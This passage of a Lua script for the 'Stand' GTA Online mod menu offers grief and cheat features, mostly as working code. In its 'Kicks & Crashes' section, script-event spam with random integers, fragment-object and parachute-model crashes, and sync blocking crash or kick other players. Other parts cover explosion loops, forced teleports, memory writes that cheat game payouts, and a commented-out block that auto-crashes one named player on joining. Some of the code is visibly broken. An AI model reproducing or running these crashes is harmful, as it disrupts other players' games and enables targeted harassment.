    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        notify("Anti Crash On")
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        notify("Anti Crash Off")
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

-------------------------------------
-- Disable Numpad
-------------------------------------

menu.toggle_loop(misc, "Disable Numpad", {"dn"}, "Disables the Numpad while Stand is open", function()
    if not menu.is_open() or lkey.is_key_down('VK_LBUTTON') or lkey.is_key_down('VK_RBUTTON') then return end
    for _, control in pairs(numpadControls) do
        PAD.DISABLE_CONTROL_ACTION(2, control, true)
    end
end)

-------------------------------------
-- Lessen Breakup
-------------------------------------

menu.toggle_loop(misc, "Activate Lessen Host when Host", {"bandaid"}, "", function ()
    local lessen = menu.ref_by_path("Online>Protections>Lessen Breakup Kicks As Host")
    if not util.is_session_transition_active() then
        if players.get_host() == players.user() then
            menu.trigger_command(lessen, "on")
        elseif players.get_host() ~= players.user() then
            menu.trigger_command(lessen, "off")
        end
    else
        -- nothing
    end
end)

-------------------------------------
-- Toggle Thunder
-------------------------------------

local thunder_on = menu.ref_by_path("Online>Session>Thunder Weather>Enable Request")
local thunder_off = menu.ref_by_path("Online>Session>Thunder Weather>Disable Request")
menu.toggle(misc, "Weather Toggle", {"Thunder"}, "", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("weather normal")
        wait(1000)
        menu.trigger_command(thunder_on)
        wait(10000)
        util.toast("Weather Set to Thunder") 
    else
        menu.trigger_command(thunder_off)
        wait(10000)
        menu.trigger_commands("weather extrasunny")
        util.toast("Weather Set back to Normal") 
    end
end)

-------------------------------------
-------------------------------------
-- Shortcuts
-------------------------------------
-------------------------------------

-------------------------------------
-- Delete Vehicle
-------------------------------------

menu.action(shortcuts, "Delete Vehicle", {"dv"}, "Deletes your current vehicle", function()
    menu.trigger_commands("deletevehicle")
end)

-------------------------------------
-- Grab Scrip Host
-------------------------------------

menu.action(shortcuts, "Grab SH", {"sh"}, "", function()
    menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
end)

-------------------------------------
-- Easy Way Out
-------------------------------------

menu.action(shortcuts, "Really easy Way out", {"ewo"}, "Kill urself", function()
	local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
	pos.z = pos.z - 1.0
	FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), pos.x, pos.y, pos.z, 0, 1.0, true, false, 1.0)
end)

-------------------------------------
-- Stop all Sounds
-------------------------------------

menu.action(shortcuts, "Force Stop all sound events", {"stopsounds"}, "", function()
    for i=-1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

-------------------------------------
-- Yeet
-------------------------------------

menu.action(shortcuts, "Unload", {"bye"}, "", function()
    menu.trigger_command(lessen, "off")
    wait(1000)
    menu.trigger_commands("unload")
end)

-------------------------------------
-- Auto Join 
-------------------------------------

menu.toggle_loop(misc, "Auto Accept Joining Games", {}, "Will auto accept join screens", function()
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        wait(200)
    end
end)

-------------------------------------
-------------------------------------
-- Tuneables
-------------------------------------
-------------------------------------

-------------------------------------
-- Easy MC Sell
-------------------------------------

function SET_INT_LOCAL(Script, Local, Value)
    if memory.script_local(Script, Local) ~= 0 then
        memory.write_int(memory.script_local(Script, Local), Value)
    end
end

local function GetLocalInt(script_str, script_local)
    local addr = memory.script_local(script_str, script_local)
    return addr ~= 0 and memory.read_int(addr) or nil
end

local function SetLocalBits(script_str, script_local, ...)
    local value = GetLocalInt(script_str, script_local)
    if value then
        return SetLocalInt(script_str, script_local, SetBits(value, ...))
    end
end

local function ClearLocalBits(script_str, script_local, ...)
    local value = GetLocalInt(script_str, script_local)
    if value then
        return SetLocalInt(script_str, script_local, ClearBits(value, ...))
    end
end

function SET_FLOAT_GLOBAL(Global, Value)
    memory.write_float(memory.script_global(Global), Value)
end

local locals = {
MCSellScriptString = "gb_biker_contraband_sell",
MCEZMissionStarted = 696+122,
MCEZMission = 696+17,
}

menu.toggle_loop(tunables, "Easy MC sell", {}, "", function()
    local value = GetLocalInt(locals.MCSellScriptString, locals.MCEZMission)
    if value and value ~= 0 then
        SetLocalInt(locals.MCSellScriptString, locals.MCEZMission, 0)
    end
end)

-------------------------------------
-- Remove Tony's Cut
-------------------------------------

 -- https://www.unknowncheats.me/forum/3347568-post13086.html

menu.toggle_loop(tunables, "Tony's Cut of Nightclub", {""}, "", function()
    SET_FLOAT_GLOBAL(262145 + 24524, 0) -- -1002770353
end, function()
    SET_FLOAT_GLOBAL(262145 + 24524, 0.1)
end)

-------------------------------------
-- Instant Finish Bunker
-------------------------------------

-- https://www.unknowncheats.me/forum/3521137-post39.html

menu.action(tunables, "Bunker", {"hcinsfinbk"}, "Selling Only", function() 
    SET_INT_LOCAL("gb_gunrunning", 1203 + 774, 0)
end)

--------------------------------------------------------------------------------
------------------------------- PLAYER FEATURES --------------------------------
--------------------------------------------------------------------------------

local function player(pid)
    
    menu.divider(menu.player_root(pid), "Lena Utilities")
    local lena = menu.list(menu.player_root(pid), "Lena Utilities", {"lenau"}, "")
    local friendly = menu.list(lena, "Friendly", {}, "")
    local trolling = menu.list(lena, "Trolling", {}, "")
    local player_removals = menu.list(lena, "Kicks & Crashes", {}, "")
    local kicks = menu.list(player_removals, "Kicks", {}, "")
    local crashes = menu.list(player_removals, "Crashes", {}, "")

-------------------------------------
-------------------------------------
-- Friendly
-------------------------------------
-------------------------------------

	-------------------------------------
	-- Repair Vehicle
	-------------------------------------

	menu.action(friendly, "Repair", {"rpv"}, "", function()
		local vehicle = get_vehicle_player_is_in(pid)
		if ENTITY.DOES_ENTITY_EXIST(vehicle) and request_control(vehicle, 1000) then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
			VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle)
			VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, 0.0)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

    -------------------------------------
	-- GOD MODE
	-------------------------------------

	menu.toggle(friendly, translate("Player - Vehicle", "God Mode"), {"vgm"}, "", function(on)
		local vehicle = get_vehicle_player_is_in(pid)
		if ENTITY.DOES_ENTITY_EXIST(vehicle) and request_control(vehicle, 1000) then
			if on then
				VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, 0.0)
				VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, 1000.0)
				VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000.0)
				VEHICLE.SET_VEHICLE_FIXED(vehicle)
				VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle)
				VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, 1000.0)
				VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, 0.0)
				for i = 0, 10 do VEHICLE.SET_VEHICLE_TYRE_FIXED(vehicle, i) end
			end
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, on)
			ENTITY.SET_ENTITY_PROOFS(vehicle, on, on, on, on, on, on, true, on)
			VEHICLE.SET_DISABLE_VEHICLE_PETROL_TANK_DAMAGE(vehicle, on)
			VEHICLE.SET_DISABLE_VEHICLE_PETROL_TANK_FIRES(vehicle, on)
			VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(vehicle, not on)
			VEHICLE.SET_VEHICLE_CAN_BREAK(vehicle, not on)
			VEHICLE.SET_VEHICLE_ENGINE_CAN_DEGRADE(vehicle, not on)
			VEHICLE.SET_VEHICLE_EXPLODES_ON_HIGH_EXPLOSION_DAMAGE(vehicle, not on)
			VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, not on)
			VEHICLE.SET_VEHICLE_WHEELS_CAN_BREAK(vehicle, not on)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

    -------------------------------------
	-- Check Stats
	-------------------------------------

    menu.action(friendly, "Check Stats", {"checkstats"}, "Checks the stats of the player", function ()
        local rank = players.get_rank(pid)
        local money = players.get_money(pid)
        local kills = players.get_kills(pid)
        local deaths = players.get_deaths(pid)
        local kdratio = players.get_kd(pid)
        thprnotify("Name : " .. players.get_name(pid) .. " Rank: " .. rank .. " Money: " .. string.format("%.2f", money/1000000) .. "M$" .. " Kills/Deaths: " .. kills .. "/" .. deaths .. " Ratio: " .. string.format("%.2f", kdratio))
    end)

-------------------------------------
-------------------------------------
-- Trolling
-------------------------------------
-------------------------------------


local tp_player = menu.list(trolling, "Teleport Player", {}, "")
local clubhouse = menu.list(tp_player, "Clubhouse", {}, "")
local facility = menu.list(tp_player, "Facility", {}, "")
local arcade = menu.list(tp_player, "Arcade", {}, "")
local warehouse = menu.list(tp_player, "Warehouse", {}, "")
local cayoperico = menu.list(tp_player, "Cayo Perico", {}, "")

for id, name in pairs(All_business_properties) do
    if id <= 12 then
        menu.action(clubhouse, name, {}, "", function()
            util.trigger_script_event(1 << pid, {0xDEE5ED91, pid, id, 0x20, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(1, 10)})
        end)
    elseif id > 12 and id <= 21 then
        menu.action(facility, name, {}, "", function()
            util.trigger_script_event(1 << pid, {0xDEE5ED91, pid, id, 0x20, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end)
    elseif id > 21 then
        menu.action(arcade, name, {}, "", function() 
            util.trigger_script_event(1 << pid, {0xDEE5ED91, pid, id, 0x20, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        end)
    end
end

local small = menu.list(warehouse, "Small Warehouse", {}, "")
local medium = menu.list(warehouse, "Medium Warehouse", {}, "")
local large = menu.list(warehouse, "Large Warehouse", {}, "")

for id, name in pairs(small_warehouses) do
    menu.action(small, name, {}, "", function()
        util.trigger_script_event(1 << pid, {0x7EFC3716, pid, 0, 1, id})
    end)
end

for id, name in pairs(medium_warehouses) do
    menu.action(medium, name, {}, "", function()
        util.trigger_script_event(1 << pid, {0x7EFC3716, pid, 0, 1, id})
    end)
end

for id, name in pairs(large_warehouses) do
    menu.action(large, name, {}, "", function()
        util.trigger_script_event(1 << pid, {0x7EFC3716, pid, 0, 1, id})
    end)
end

menu.action(tp_player, "Heist Passed Apartment Teleport", {}, "", function()
    util.trigger_script_event(1 << pid, {0xAD1762A7, players.user(), pid, -1, 1, 1, 0, 1, 0}) 
end) 

menu.action(cayoperico, "Cayo Perico", {"tpcayo"}, "", function()
    util.trigger_script_event(1 << pid, {0x4868BC31, pid, 0, 0, 0x3, 1})
end)

menu.action(cayoperico, "Cayo Perico (No Cutscene)", {"cayo"}, "", function()
    util.trigger_script_event(1 << pid, {0x4868BC31, pid, 0, 0, 0x4, 1})
end)

menu.action(cayoperico, "Leaving Cayo Perico", {"cayoleave"}, "Player Must Be At Cayo Perico To Trigger This Event", function()
    util.trigger_script_event(1 << pid, {0x4868BC31, pid, 0, 0, 0x3})
end)

menu.action(cayoperico, "Kicked From Cayo Perico", {"cayokick"}, "", function()
    util.trigger_script_event(1 << pid, {0x4868BC31, pid, 0, 0, 0x4, 0})
end)

	-------------------------------------
	-- EXPLOSIONS
	-------------------------------------

	local customExplosion <const> = menu.list(trolling, translate("Trolling", "Custom Explosion"), {}, "")
	local Explosion =
	{
		audible = true,
		delay = 500,
		owned = true,
		type = 0,
		invisible = false
	}

	---@param pid Player
	function Explosion:explodePlayer(pid)
		local pos = players.get_position(pid)
		pos.z = pos.z - 1.0
		if self.owned then self:addOwnedExplosion(pos) else self:addExplosion(pos) end
	end

	---@param pos v3
	function Explosion:addOwnedExplosion(pos)
		FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), pos, self.type, 1.0, self.audible, self.invisible, 0.0)
	end

	---@param pos v3
	function Explosion:addExplosion(pos)
		FIRE.ADD_EXPLOSION(pos, self.type, 1.0, self.audible, self.invisible, 0.0, false)
	end

	menu.slider(customExplosion, translate("Trolling - Custom Explosion", "Explosion Type"), {}, "",
		0, 72, 0, 1, function(value) Explosion.type = value end)

	menu.toggle(customExplosion, translate("Trolling - Custom Explosion", "Invisible"), {}, "",
		function(on) Explosion.invisible = on end)

	menu.toggle(customExplosion, translate("Trolling - Custom Explosion", "Silent"), {}, "",
		function(on) Explosion.audible = not on end)

	menu.toggle(customExplosion, translate("Trolling - Custom Explosion", "Owned Explosions"), {}, "",
		function(on) Explosion.owned = on end)

	menu.slider(customExplosion, translate("Trolling - Custom Explosion", "Loop Speed"), {}, "",
		50, 1000, 300, 10, function(value) Explosion.delay = value end)

	menu.action(customExplosion, translate("Trolling - Custom Explosion", "Explode"), {}, "", function ()
		Explosion:explodePlayer(pid)
	end)


	local usingExplosionLoop = false
	menu.toggle(customExplosion, translate("Trolling - Custom Explosion", "Explosion Loop"), {}, "", function(on)
		usingExplosionLoop = on
		while usingExplosionLoop and is_player_active(pid, false, true) and
		not util.is_session_transition_active() do
			Explosion:explodePlayer(pid)
			wait(Explosion.delay)
		end
	end)

-------------------------------------
-- KILL AS THE ORBITAL CANNON
-------------------------------------

    local trans = {
        Passive = translate("Trolling", "The player is in passive mode"),
        InInterior = translate("Trolling", "The player is in interior")
    }

    menu.action(trolling, translate("Trolling", "Kill With Orbital Cannon"), {"orbital"}, "", function()
        if is_player_in_any_interior(pid) then
            notification:help(trans.InInterior, HudColour.red)
        elseif is_player_passive(pid) then
            notification:help(trans.Passive, HudColour.red)
        elseif not OrbitalCannon.exists() and PLAYER.IS_PLAYER_PLAYING(pid) then
            OrbitalCannon.create(pid)
        end
    end)

-------------------------------------
-- Disable Passive
-------------------------------------



menu.action(trolling, "Disable Passive Mode", {"pussive"}, "", function()

end)

-------------------------------------
-- Launch Player Vehicle
-------------------------------------

    menu.action_slider(trolling, "Launch Player Vehicle", {}, "", launch_vehicle, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            notify("Player isn't in a vehicle. :/")
            return
        end

        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            wait()
        end

        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
            notify("Failed to get control of the vehicle. :/")
            return
        end

        pluto_switch value do
            case "Launch Up":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Launch Forward":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Launch Backwards":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, -100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Launch Down":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, -100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Slingshot":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            end
        end)

-------------------------------------
-------------------------------------
-- Kicks & Crashes
-------------------------------------
-------------------------------------

-------------------------------------
-- Block Join Kicks
-------------------------------------

    if menu.get_edition() >= 2 then 
        menu.action(kicks, "Block Join Kick", {"EMP"}, "Discription.... yes", function()
            menu.trigger_commands("historyblock " .. players.get_name(pid))
            menu.trigger_commands("breakup" .. players.get_name(pid))
        end, nil, nil, COMMANDPERM_RUDE)
    end

-------------------------------------
-- Simple Kicks
-------------------------------------

    if menu.get_edition() >= 2 then 
        menu.action(kicks, "Rape", {"rape"}, "Discription.... yes", function()
            menu.trigger_commands("breakup" .. players.get_name(pid))
        end, nil, nil, COMMANDPERM_RUDE)
    end

-------------------------------------
-- Crashes
-------------------------------------

    menu.action(crashes, "Block Join Crash", {""}, "", function()
        wait(500)
        menu.trigger_commands("choke " .. players.get_name(pid))
        wait(500)
        menu.trigger_commands("crash " .. players.get_name(pid))
        wait(500)
        menu.trigger_commands("historyblock" .. players.get_name(pid))
    end)

    local nature = menu.list(crashes, "Para", {}, "")
    menu.action(nature, "Version 1", {"V1"}, "", function()
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        BlockSyncs(pid, function() 
            wait(100)
            menu.trigger_commands("invisibility on")
            for i = 0, 110 do
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
                PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
                wait(50)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            end
            wait(250)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.wait) 
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0) 
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            menu.trigger_commands("invisibility off")
        end)
    end)
    
    menu.action(nature, "Version 2", {"V2"}, "", function()
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        BlockSyncs(pid, function() 
            wait(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            wepON.GIVE_DELAYED_wepON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            wait()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            wait(250)
            wepON.GIVE_DELAYED_wepON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            wait(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.wait)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
        end)
    end, nil, nil, COMMANDPERM_RUDE)

    menu.action(crashes, "V3", {"v3"}, "", function()
        local mdl = util.joaat('a_c_poodle')
        BlockSyncs(pid, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                wait(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                wepON.GIVE_wepON_TO_PED(ped1, util.joaat('wepON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = wepON.GET_CURRENT_PED_wepON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or wait()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                wait(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                wait(1000)
            else
                notify("Failed to load model. :/")
            end
        end)
    end)
    
    menu.action(crashes, "Fragment Crash", {""}, "", function()
        BlockSyncs(pid, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            wait(1000)
            entities.delete_by_handle(object)
        end)
    end)

    menu.action(crashes, "Lena's Crash", {"ICBM"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
        wait()
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        end
        menu.trigger_commands("givesh " .. players.get_name(pid))
        wait(100)
        util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

-------------------------------------
-- Player Notifications
-------------------------------------

    --[[ Julia
    if players.get_rockstar_id(pid) == 64681341 then
        util.log("'" .. players.get_name(pid) .. "'" .. " is now in this lobby")
        --chat.send_message("Player " .. players.get_name(pid) .. " is now in this lobby", true, true, true)
    end

    -- Lucy
    if players.get_rockstar_id(pid) == 80252783 then
        util.log("'" .. players.get_name(pid) .. "'" .. " is now in this lobby")
        --chat.send_message("Player " .. players.get_name(pid) .. " is now in this lobby", true, true, true)
    end

    -- Kili
    if players.get_rockstar_id(pid) == 150742615 then
        util.log("'" .. players.get_name(pid) .. "'" .. " is now in this lobby")
        --chat.send_message("Player " .. players.get_name(pid) .. " is now in this lobby", true, true, true)
    end

    -- Sophie
    if players.get_rockstar_id(pid) == 166696902 then
        util.log("'" .. players.get_name(pid) .. "'" .. " is now in this lobby")
        --chat.send_message("Player " .. players.get_name(pid) .. " is now in this lobby", true, true, true)
    end

    -- Ganja
    if players.get_rockstar_id(pid) == 75089880 then
        util.log("'" .. players.get_name(pid) .. "'" .. " is now in this lobby")
        --chat.send_message("Player " .. players.get_name(pid) .. " is now in this lobby", true, true, true)
        menu.trigger_commands("ngcrash " .. players.get_name(pid))
    end

    --Phoenix ig
    --if players.get_rockstar_id(pid) == 216142317 then
        util.log("'" .. players.get_name(pid) .. "'" .. " is now in this lobby")
        chat.send_message("Player " .. players.get_name(pid) .. " is now in this lobby", true, true, true)
    end

    local Block_Breakups = menu.ref_by_path("Online>Protections>Breakup Kick Reactions>Block")
        -- Florentina
        if players.get_rockstar_id(pid) == 212858919 then
            menu.trigger_command(Block_Breakups)
            notify("Tina joined the session, disabling block kicks")
        end
        -- Crystal
        if players.get_rockstar_id(pid) == 132670200 then
            menu.trigger_command(Block_Breakups)
            notify("Tina joined the session, disabling block kicks")
        end

    -- Wasp-Nest
    if players.get_rockstar_id(pid) == 178248141 then
        util.log("'" .. players.get_name(pid) .. "'" .. " (Idiot) is now in this lobby")
    end]]
end

function UnregisterNetworkObject(object, reason, force1, force2)
	local netObj = get_net_obj(object)
	if netObj == NULL then
		return false
	end
	local net_object_mgr = memory.read_long(CNetworkObjectMgr)
	if net_object_mgr == NULL then
		return false
	end
	util.call_foreign_function(UnregisterNetworkObject_addr, net_object_mgr, netObj, reason, force1, force2)
	return true
end

function ChangeNetObjOwner(object, player)
	if NETWORK.NETWORK_IS_SESSION_STARTED() then
		local net_object_mgr = memory.read_long(CNetworkObjectMgr)
		if net_object_mgr == NULL then
			return false
		end
		if not ENTITY.DOES_ENTITY_EXIST(object) then
			return false
		end
		local netObj = get_net_obj(object)
		if netObj == NULL then
			return false
		end
		local net_game_player = GetNetGamePlayer(player)
		if net_game_player == NULL then
			return false
		end
		util.call_foreign_function(ChangeNetObjOwner_addr, net_object_mgr, netObj, net_game_player, 0)
		return true
	else
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
		return true
	end
end

-------------------------------------
-- Clear Area
-------------------------------------

menu.list_action(misc, "Clear All...", {}, "", {"Peds", "Vehicles", "Objects", "Pickups", "Ropes", "Projectiles", "Sounds"}, function(index, name)
    notify("Clearing "..name:lower().."...")
    local counter = 0
    pluto_switch index do
        case 1:
            for _, ped in ipairs(entities.get_all_peds_as_handles()) do
                if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ped) and (not NETWORK.NETWORK_IS_ACTIVITY_SESSION() or NETWORK.NETWORK_IS_ACTIVITY_SESSION() and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(ped)) then
                    entities.delete_by_handle(ped)
                    counter += 1
                    wait()
                end
            end
            break
        case 2:
            for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
                if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and DECORATOR.DECOR_GET_INT(vehicle, "Player_Vehicle") == 0 and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    entities.delete_by_handle(vehicle)
                    counter += 1
                end
                wait()
            end
            break
        case 3:
            for _, object in ipairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(object)
                counter += 1
                wait()
            end
            break
        case 4:
            for _, pickup in ipairs(entities.get_all_pickups_as_handles()) do
                entities.delete_by_handle(pickup)
                counter += 1
                wait()
            end
            break
        case 5:
            local temp = memory.alloc(4)
            for i = 0, 101 do
                memory.write_int(temp, i)
                if PHYSICS.DOES_ROPE_EXIST(temp) then
                    PHYSICS.DELETE_ROPE(temp)
                    counter += 1
                end
                wait()
            end
            break
        case 6:
            local coords = players.get_position(players.user())
            MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 1000, 0)
            counter = "all"
            break
        case 4:
            for i = 0, 99 do
                AUDIO.STOP_SOUND(i)
                wait()
            end
        break
    end
    notify("Cleared "..tostring(counter).." "..name:lower()..".")
end)

menu.action(misc, "Clear Area", {"ca"}, "", function()
    local cleanse_entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ped) and (not NETWORK.NETWORK_IS_ACTIVITY_SESSION() or NETWORK.NETWORK_IS_ACTIVITY_SESSION() and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(ped)) then
            entities.delete_by_handle(ped)
            cleanse_entitycount += 1
            wait()
        end
    end
    notify("Cleared " .. cleanse_entitycount .. " Peds")
    cleanse_entitycount = 0
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and DECORATOR.DECOR_GET_INT(vehicle, "Player_Vehicle") == 0 and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
            entities.delete_by_handle(vehicle)
            cleanse_entitycount += 1
            wait()
        end
    end
    notify("Cleared ".. cleanse_entitycount .." Vehicles")
    cleanse_entitycount = 0
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(object)
        cleanse_entitycount += 1
        wait()
    end
    notify("Cleared " .. cleanse_entitycount .. " Objects")
    cleanse_entitycount = 0
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        entities.delete_by_handle(pickup)
        cleanse_entitycount += 1
        wait()
    end
    notify("Cleared " .. cleanse_entitycount .. " Pickups")
    local temp = memory.alloc(4)
    for i = 0, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
    end
end)

-------------------------------------
-------------------------------------
-- Tuneables
-------------------------------------
-------------------------------------





-------------------------------------
-------------------------------------
-- On-Stop
-------------------------------------
-------------------------------------

-------------------------------------
-- Functions
-------------------------------------

---@param name string
---@param pattern string
---@param callback fun(address: integer)
function memoryScan(name, pattern, callback)
	local address = memory.scan(pattern)
	assert(address ~= NULL, "memory scan failed: " .. name)
	callback(address)
end

memoryScan("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
	GetNetGamePlayer_addr = address
end)

memoryScan("CNetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
	CNetworkObjectMgr = memory.rip(address + 3)
end)

---@param player integer
---@return integer
function GetNetGamePlayer(player)
	return util.call_foreign_function(GetNetGamePlayer_addr, player)
end

---@param addr integer
---@return string
function read_net_address(addr)
	local fields = {}
